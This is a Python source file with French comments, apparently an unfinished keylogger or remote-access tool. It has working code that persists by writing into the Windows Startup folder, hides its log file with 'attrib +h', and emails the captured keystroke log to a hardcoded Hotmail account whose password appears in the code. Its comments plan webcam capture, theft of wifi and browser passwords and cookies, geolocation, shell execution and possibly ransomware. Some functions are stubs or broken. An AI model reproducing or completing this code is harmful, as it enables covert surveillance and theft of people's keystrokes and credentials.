import os
import socket
import smtplib
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

##############################################################################################
# la fonction create_log_file et send_log_mail fonctionnent pour le keylogger                #
# faire une class pour le keylogger ???                                                      #
# reste a faire : camera + extraction mdp wifi / dans le navigateur(ou cookie de connection) #
#  + géoloc + shell_exec maybe ransoware si besoin et si temps diviser le prog en fonction   #
# des besoins gerer le cas où les libs sont pas présentes ou absence de cam ou autre         # 
#  essayer de voir comment on peut séparer les différentes fonctionnalités dans le code      #
##############################################################################################




def write_in_startup(filename, file_content):
    """fonction permettant d'écrire en créant un nouveau fichier dans le dossier startup
       prend deux arguements, le nom du fichier et son contenu"""
    username = os.getlogin()
    path_to_startup = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filename}"  
    file = open(path_to_startup,"w")
    file.write(file_content)

def send_log_mail():
    """
    fonction permettant d'envoyer le fichier de backup du keylogger par mail
    """
    email = "sending.address420@hotmail.com"
    message = MIMEMultipart()
    message["From"] = email                   # sender email address
    message['To'] = email                     # receiving email address 
    message['Subject'] = f"keylogger file of {str(datetime.datetime.now())[:22]}" # mail subject
    file = "./log.txt"                        # path to file
    attachment = open(file,'rb')              # reading into file
    obj = MIMEBase('application', 'octet-stream') # content type header 
    obj.set_payload((attachment).read())      # set attachment to the email
    encoders.encode_base64(obj)               # base64 encode the attachment 
    obj.add_header('Content-Disposition',f"attachment; filename={file}")  # add header 
    message.attach(obj)                       
    my_message = message.as_string()
    email_session = smtplib.SMTP('smtp.outlook.com',587)
    email_session.starttls()
    email_session.login(email,'havefuninlife<3')
    email_session.sendmail(email, email,my_message)
    email_session.quit()
    print("YOUR MAIL HAS BEEN SENT SUCCESSFULLY")


def start():
    if keylogger_listening == False:
        keylogger_listening = True

def stop():
    if keylogger_listening == True:
        keylogger_listening = False

def is_working():
    return keylogger_listening

def create_log_file():
    log = open("./log.txt", "w") 
    os.system("attrib +h ./log.txt")       

def send_data():
    send_log_mail(stored_data)        

def keylogger():
    """ fonction dans laquelle on gèrera tout ce qui est en lien avec le keylogger et qui aura son propre thread
    """
    pass


def main():
    create_log_file()
    
    #ip = "172.20.69.182"
    #port = 9999

    #server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #server.sendto()
    
    
if __name__ == '__main__':
    main()